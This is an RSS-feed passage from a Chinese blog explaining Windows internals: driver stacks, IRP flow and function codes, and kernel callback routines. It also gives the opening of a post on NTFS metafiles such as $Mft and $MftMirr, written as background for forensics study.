&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（显卡硬件驱动）        ← 底层（显卡硬件控制）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;音频设备驱动栈&#34;&gt;音频设备驱动栈
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;audiosrv（音频服务）                 ← 顶层（用户模式服务）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sysaudio.sys（系统音频驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HDAudio.sys（高定义音频驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（声卡厂商驱动）        ← 底层（硬件控制）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;irp&#34;&gt;IRP
&lt;/h1&gt;&lt;h2 id=&#34;irp-是什么&#34;&gt;IRP 是什么
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;IRP的全称是I/O Request Packet，即I/O 请求包&lt;/strong&gt;，是内核中用于描述和传递所有I/O请求的核心数据结构&lt;/p&gt;
&lt;p&gt;当一个I/O请求产生时，I/O管理器会创建一个IRP对象，这个IRP就像一张填写好的快递单，上面包含了所有与本次请求相关的信息，如操作类型、数据缓冲区地址、目标设备等&lt;/p&gt;
&lt;p&gt;之后，I/O管理器会将这张快递单发送给目标设备对应的驱动程序栈，驱动程序通过处理这些 IRP 来完成工作&lt;/p&gt;
&lt;p&gt;恶意软件经常通过IRP挂钩的技术来劫持系统功能，它会找到一个正常驱动的IRP处理函数地址，并将其替换为指向自己恶意代码的地址。这样，所有发往正常驱动的IRP都会先被恶意软件截胡，从而实现键盘记录、文件隐藏等功能&lt;/p&gt;
&lt;h2 id=&#34;irp在驱动栈中的传递&#34;&gt;IRP在驱动栈中的传递
&lt;/h2&gt;&lt;h3 id=&#34;irp创建&#34;&gt;IRP创建
&lt;/h3&gt;&lt;p&gt;应用程序调用如&lt;code&gt;ReadFile()&lt;/code&gt;，系统调用相关内核服务，内核根据请求生成一个IRP&lt;/p&gt;
&lt;p&gt;IRP包含请求类型、缓冲区地址、请求参数等信息&lt;/p&gt;
&lt;h3 id=&#34;irp发送到驱动栈顶层驱动&#34;&gt;IRP发送到驱动栈顶层驱动
&lt;/h3&gt;&lt;p&gt;例如，磁盘驱动栈中，顶层可能是文件系统驱动（&lt;code&gt;ntfs.sys&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;内核将IRP传递给顶层驱动的&lt;code&gt;Dispatch&lt;/code&gt;函数&lt;/p&gt;
&lt;h3 id=&#34;驱动处理irp&#34;&gt;驱动处理IRP
&lt;/h3&gt;&lt;p&gt;驱动检查IRP内容，执行相应操作（如文件系统解析、数据缓存等）&lt;/p&gt;
&lt;p&gt;驱动可以完成请求，或者决定将IRP向下传递&lt;/p&gt;
&lt;h3 id=&#34;irp向下传递给下一个驱动&#34;&gt;IRP向下传递给下一个驱动
&lt;/h3&gt;&lt;p&gt;驱动调用&lt;code&gt;IoSkipCurrentIrpStackLocation&lt;/code&gt;，跳过当前驱动的IRP堆栈位置&lt;/p&gt;
&lt;p&gt;然后调用&lt;code&gt;IoCallDriver&lt;/code&gt;把IRP传给下一个驱动，通常是更底层的驱动&lt;/p&gt;
&lt;h3 id=&#34;依次传递直到最底层驱动&#34;&gt;依次传递直到最底层驱动
&lt;/h3&gt;&lt;p&gt;IRP会层层传递，直到最底层的硬件驱动处理它&lt;/p&gt;
&lt;p&gt;底层驱动发起对硬件的实际操作，比如读写磁盘、发送网络包&lt;/p&gt;
&lt;h3 id=&#34;irp完成&#34;&gt;IRP完成
&lt;/h3&gt;&lt;p&gt;硬件操作完成后，底层驱动调用&lt;code&gt;IoCompleteRequest&lt;/code&gt;标记 IRP 完成&lt;/p&gt;
&lt;p&gt;IRP 结果逐层向上传递回去，每层驱动可以执行清理或后处理，最终结果反馈给系统和应用程序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;应用程序请求
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IRP创建
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntfs.sys（文件系统驱动）        ← 顶层
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;volmgr.sys（卷管理器驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;partmgr.sys（分区管理驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disk.sys（磁盘驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;storport.sys（存储端口驱动）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 传递IRP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver（硬件控制驱动）  ← 底层
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 硬件操作
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;硬件设备完成请求
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 结果返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Miniport Driver
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;storport.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disk.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;partmgr.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;volmgr.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntfs.sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ↓ 返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;操作系统
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;常见irp主要功能码&#34;&gt;常见IRP主要功能码
&lt;/h2&gt;&lt;p&gt;每个IRP都包含一个主要功能码，用于定义本次请求的核心操作类型&lt;/p&gt;
&lt;h3 id=&#34;文件与设备管理&#34;&gt;文件与设备管理
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_create&#34;&gt;IRP_MJ_CREATE
&lt;/h4&gt;&lt;p&gt;打开或创建文件、设备句柄&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_close&#34;&gt;IRP_MJ_CLOSE
&lt;/h4&gt;&lt;p&gt;关闭文件或设备句柄&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_read&#34;&gt;IRP_MJ_READ
&lt;/h4&gt;&lt;p&gt;从文件或设备读取数据&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_write&#34;&gt;IRP_MJ_WRITE
&lt;/h4&gt;&lt;p&gt;向文件或设备写入数据&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_query_information&#34;&gt;IRP_MJ_QUERY_INFORMATION
&lt;/h4&gt;&lt;p&gt;查询文件或设备信息（大小、属性等）&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_set_information&#34;&gt;IRP_MJ_SET_INFORMATION
&lt;/h4&gt;&lt;p&gt;设置文件或设备信息（修改属性等）&lt;/p&gt;
&lt;h3 id=&#34;设备控制&#34;&gt;设备控制
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_device_control&#34;&gt;IRP_MJ_DEVICE_CONTROL
&lt;/h4&gt;&lt;p&gt;向驱动发送自定义控制命令（用户模式到驱动的常用命令）&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_internal_device_control&#34;&gt;IRP_MJ_INTERNAL_DEVICE_CONTROL
&lt;/h4&gt;&lt;p&gt;驱动间内部控制命令，供驱动程序之间通信使用&lt;/p&gt;
&lt;h3 id=&#34;即插即用pnp&#34;&gt;即插即用（PnP）
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_pnp&#34;&gt;IRP_MJ_PNP
&lt;/h4&gt;&lt;p&gt;即插即用事件通知，如设备启动、停止、移除、资源分配等&lt;/p&gt;
&lt;h3 id=&#34;电源管理&#34;&gt;电源管理
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_power&#34;&gt;IRP_MJ_POWER
&lt;/h4&gt;&lt;p&gt;电源状态管理请求，如休眠、唤醒、电源状态改变等&lt;/p&gt;
&lt;h3 id=&#34;文件系统控制&#34;&gt;文件系统控制
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_file_system_control&#34;&gt;IRP_MJ_FILE_SYSTEM_CONTROL
&lt;/h4&gt;&lt;p&gt;文件系统特定控制请求，如卷挂载、卸载等&lt;/p&gt;
&lt;h3 id=&#34;系统管理&#34;&gt;系统管理
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_shutdown&#34;&gt;IRP_MJ_SHUTDOWN
&lt;/h4&gt;&lt;p&gt;系统关机或重启时通知驱动准备关闭&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_create_mailslot&#34;&gt;IRP_MJ_CREATE_MAILSLOT
&lt;/h4&gt;&lt;p&gt;创建邮件槽（用于进程间通信）&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_query_security&#34;&gt;IRP_MJ_QUERY_SECURITY
&lt;/h4&gt;&lt;p&gt;查询安全描述符&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_set_security&#34;&gt;IRP_MJ_SET_SECURITY
&lt;/h4&gt;&lt;p&gt;设置安全描述符&lt;/p&gt;
&lt;h3 id=&#34;其他常见功能码&#34;&gt;其他常见功能码
&lt;/h3&gt;&lt;h4 id=&#34;irp_mj_query_volume_information&#34;&gt;IRP_MJ_QUERY_VOLUME_INFORMATION
&lt;/h4&gt;&lt;p&gt;查询卷信息&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_set_volume_information&#34;&gt;IRP_MJ_SET_VOLUME_INFORMATION
&lt;/h4&gt;&lt;p&gt;设置卷信息&lt;/p&gt;
&lt;h4 id=&#34;irp_mj_cleanup&#34;&gt;IRP_MJ_CLEANUP
&lt;/h4&gt;&lt;p&gt;清理（关闭时，释放资源等）&lt;/p&gt;
&lt;h1 id=&#34;内核回调&#34;&gt;内核回调
&lt;/h1&gt;&lt;h2 id=&#34;什么是内核回调&#34;&gt;什么是内核回调
&lt;/h2&gt;&lt;p&gt;内核回调（Kernel Callbacks） 是一种事件驱动的机制&lt;/p&gt;
&lt;p&gt;它允许内核模式的驱动程序向操作系统内核注册特定的系统级事件，当这些被注册的事件发生时，内核会暂停其正常操作流程，并逐一回调所有已注册的驱动程序提供的函数，即回调例程&lt;/p&gt;
&lt;p&gt;这是内核提供的一个事件通知系统，驱动程序不再需要通过不断轮询的方式来检查某个状态是否改变，而是可以被动地、在事件发生时才被内核精准地唤醒和调用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例（用户态）：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;OnButtonClick&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;按钮被点击！&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;RegisterButtonCallback&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;OnButtonClick&lt;/span&gt;); &lt;span style=&#34;color:#7f848e&#34;&gt;// 注册回调
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;系统中，“按钮被点击”事件发生后，会自动调用注册的&lt;code&gt;OnButtonClick()&lt;/code&gt;函数&lt;/p&gt;
&lt;h2 id=&#34;内核回调工作过程&#34;&gt;内核回调工作过程
&lt;/h2&gt;&lt;h3 id=&#34;注册&#34;&gt;注册
&lt;/h3&gt;&lt;p&gt;在驱动程序的初始化阶段（通常是在&lt;code&gt;DriverEntry&lt;/code&gt;函数中），驱动程序会调用一个由内核导出的、特定于事件类型的注册函数。例如，要监控进程创建，驱动程序会调用&lt;code&gt;PsSetCreateProcessNotifyRoutine&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在调用时，驱动程序会将一个指向自己内部实现的回调函数的地址，作为一个参数传递给内核&lt;/p&gt;
&lt;p&gt;内核接收到这个请求后，会将这个函数地址添加到一个与该事件类型相关联的、内部维护的回调函数指针链表中&lt;/p&gt;
&lt;h3 id=&#34;触发&#34;&gt;触发
&lt;/h3&gt;&lt;p&gt;当一个被订阅的系统事件发生时（例如&lt;code&gt;NtCreateUserProcess&lt;/code&gt;系统调用被执行以创建一个新进程），内核在完成其核心操作的某个特定阶段，会暂停下来&lt;/p&gt;
&lt;h3 id=&#34;调用&#34;&gt;调用
&lt;/h3&gt;&lt;p&gt;内核会找到与该事件对应的回调函数指针链表，然后，它会依次遍历这个链表，并同步地调用每一个已注册的回调函数&lt;/p&gt;
&lt;p&gt;内核会将与事件相关的上下文信息（例如，对于进程创建事件，会传递新进程的PID、创建者信息等）作为参数传递给回调函数&lt;/p&gt;
&lt;h3 id=&#34;处理&#34;&gt;处理
&lt;/h3&gt;&lt;p&gt;驱动程序的回调函数被调用后，便可以在其函数体内执行自定义的逻辑&lt;/p&gt;
&lt;p&gt;它可以仅仅记录该事件，也可以进行干预，例如阻止该事件的完成（如果回调类型允许的话）&lt;/p&gt;
&lt;h2 id=&#34;常见内核回调&#34;&gt;常见内核回调
&lt;/h2&gt;&lt;h3 id=&#34;进程与线程相关回调&#34;&gt;进程与线程相关回调
&lt;/h3&gt;&lt;h4 id=&#34;pssetcreateprocessnotifyroutine&#34;&gt;PsSetCreateProcessNotifyRoutine
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：当进程创建或退出时触发&lt;/li&gt;
&lt;li&gt;用途：监控进程行为（如杀毒软件、行为分析等）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;pssetcreatethreadnotifyroutine&#34;&gt;PsSetCreateThreadNotifyRoutine
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：当线程被创建或销毁时触发&lt;/li&gt;
&lt;li&gt;用途：检测线程注入、远程线程创建&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;映像加载相关回调&#34;&gt;映像加载相关回调
&lt;/h3&gt;&lt;h4 id=&#34;pssetloadimagenotifyroutine&#34;&gt;PsSetLoadImageNotifyRoutine
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：当模块（如EXE、DLL）被加载到进程时触发&lt;/li&gt;
&lt;li&gt;用途：监视DLL是否注入或加载非法模块&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注册表操作回调&#34;&gt;注册表操作回调
&lt;/h3&gt;&lt;h4 id=&#34;cmregistercallbackcmregistercallbackex&#34;&gt;CmRegisterCallback/CmRegisterCallbackEx
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：在注册表被访问（读写、删除等）时触发&lt;/li&gt;
&lt;li&gt;用途：拦截修改注册表、保护启动项&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;文件系统监控回调&#34;&gt;文件系统监控回调
&lt;/h3&gt;&lt;h4 id=&#34;fsrtlregisterfilesystemfiltercallbacks&#34;&gt;FsRtlRegisterFileSystemFilterCallbacks
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：文件系统过滤驱动使用的回调注册接口&lt;/li&gt;
&lt;li&gt;用途：监视文件访问、隐藏或加密文件等（如勒索软件防护、杀毒软件）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;电源管理与关机回调&#34;&gt;电源管理与关机回调
&lt;/h3&gt;&lt;h4 id=&#34;ioregistershutdownnotification&#34;&gt;IoRegisterShutdownNotification
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：注册系统关机前通知&lt;/li&gt;
&lt;li&gt;用途：清理资源、保存数据、记录日志&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;poregisterpowersettingcallback&#34;&gt;PoRegisterPowerSettingCallback
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：注册电源策略变化回调（如睡眠、唤醒）&lt;/li&gt;
&lt;li&gt;用途：管理节能策略或唤醒唤醒设备&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;蓝屏-bugcheck-回调&#34;&gt;蓝屏 (BugCheck) 回调
&lt;/h3&gt;&lt;h4 id=&#34;keregisterbugcheckcallback&#34;&gt;KeRegisterBugCheckCallback
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：系统蓝屏前调用，允许驱动记录崩溃状态&lt;/li&gt;
&lt;li&gt;用途：记录调试信息、保存崩溃快照&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;windows事件通知类回调&#34;&gt;Windows事件通知类回调
&lt;/h3&gt;&lt;h4 id=&#34;exregistercallback&#34;&gt;ExRegisterCallback
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：内核模块之间广播通知&lt;/li&gt;
&lt;li&gt;用途：驱动之间共享事件信息（如热插拔、电池状态）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;网络相关回调&#34;&gt;网络相关回调
&lt;/h3&gt;&lt;h4 id=&#34;fwpscalloutregister&#34;&gt;FwpsCalloutRegister
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：用于网络过滤和处理框架Windows Filtering Platform注册网络流量过滤回调&lt;/li&gt;
&lt;li&gt;用途：监控/拦截网络通信（如防火墙、DLP系统）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ndisregisterprotocoldriver&#34;&gt;NdisRegisterProtocolDriver
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：注册协议驱动的接收/发送回调函数&lt;/li&gt;
&lt;li&gt;用途：网络监控、抓包、VPN实现等&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;安全与对象管理回调&#34;&gt;安全与对象管理回调
&lt;/h3&gt;&lt;h4 id=&#34;obregistercallbacks&#34;&gt;ObRegisterCallbacks
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：监控对象句柄操作，如进程句柄、线程句柄&lt;/li&gt;
&lt;li&gt;用途：防止进程被调试、注入、终止（常用于反作弊或病毒保护）&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>windows相关知识总结（上）</title>
        <link>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/</link>
        <pubDate>Mon, 21 Jul 2025 12:17:22 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/</guid>
        <description>&lt;img src="http://picture.928330.xyz/typora/628735" alt="Featured image of post windows相关知识总结（上）" /&gt;&lt;p&gt;写下这篇文章的原因是因为最近在学习电子取证，使用Volatility多少得看得懂输出才行&lt;/p&gt;
&lt;p&gt;现在只是大概的了解，如果后续有时间，会把每一个板块都单独拿出来学习的&lt;/p&gt;
&lt;p&gt;嗯，如果有时间的话&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;windows相关知识总结（下）&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;ntfs文件系统&#34;&gt;NTFS文件系统
&lt;/h1&gt;&lt;h2 id=&#34;什么是ntfs&#34;&gt;什么是NTFS
&lt;/h2&gt;&lt;p&gt;NTFS，全称New Technology File System，是自WindowsNT以来微软所有现代操作系统的标准文件系统&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在NTFS卷上，一切皆文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这不仅包括我们日常所见的普通文件和目录，用于描述和管理文件系统自身的元数据也同样被组织成一系列特殊的文件，这种设计极大地增强了文件系统的灵活性和可恢复性&lt;/p&gt;
&lt;h2 id=&#34;核心元文件&#34;&gt;核心元文件
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;这是NTFS文件系统内部使用的一组以&lt;code&gt;$&lt;/code&gt;开头的特殊隐藏文件，用于维护整个文件系统的结构、状态和完整性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它们不像普通用户文件那样可见或可操作，而是被NTFS在后台自动创建和管理，保存着关于文件、目录、磁盘空间、日志、安全信息等的元数据&lt;/p&gt;
&lt;p&gt;大致结构如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NTFS Root
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Mft
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $MftMirr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $LogFile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Volume
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Bitmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $BadClus
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $AttrDef
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Secure
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Extend
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   ├── $Quota
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   ├── $ObjId
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   ├── $Reparse
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│   └── $UsnJrnl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $UpCase
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├── $Boot
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└── ...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;mft&#34;&gt;$Mft
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;MFT，即主文件表，是NTFS文件系统的核心数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它本身是一个特殊文件，由一系列固定大小的文件记录（通常为1024字节）组成&lt;/p&gt;
&lt;p&gt;卷上的每一个文件和目录都至少对应MFT中的一个文件记录，该记录包含一个头部和一系列描述文件所有信息的属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它的主要用途是作为整个卷的索引目录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;操作系统进行任何文件操作（如查找、读取、写入、权限检查）时，都必须首先查询$Mft以获取文件的元数据，包括时间戳、大小、权限以及数据在磁盘上的物理位置&lt;/p&gt;
&lt;p&gt;我们后面会详细说明它：[MFT](#NTFS的关键结构 —— 主文件表MFT)&lt;/p&gt;
&lt;h3 id=&#34;mftmirr&#34;&gt;$MftMirr
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;MftMirr是主文件表的一个部分备份或镜像&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它通常只包含Mft最开头的几个关键文件记录（例如描述Mft自身、LogFile等元文件的记录）&lt;/p&gt;
&lt;p&gt;为了提高容灾能力，它在物理磁盘上的存储位置通常远离Mft&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其唯一的用途是文件系统恢复&lt;/strong&gt;&lt;/p&gt;
